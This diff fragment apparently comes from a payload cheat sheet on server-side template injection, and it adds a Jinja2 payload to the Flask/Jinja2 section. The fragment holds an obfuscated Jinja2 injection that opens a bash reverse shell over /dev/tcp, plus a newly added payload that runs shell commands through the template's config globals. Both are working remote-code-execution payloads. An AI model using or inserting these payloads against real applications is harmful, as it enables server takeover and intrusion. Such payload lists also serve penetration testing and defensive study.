@@ -10,6 +10,10 @@
 {% iconfigf ''.__claconfigss__.__mconfigro__[2].__subclasconfigses__()[59].__init__.func_glconfigobals.linecconfigache.oconfigs.popconfigen('bash -i >& /dev/tcp/127.0.0.1/233 0>&1') %}1{% endiconfigf %}
 ```
 
+```python
+{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
+```
+
 ### Flask/Jinja2
 
 ### Django
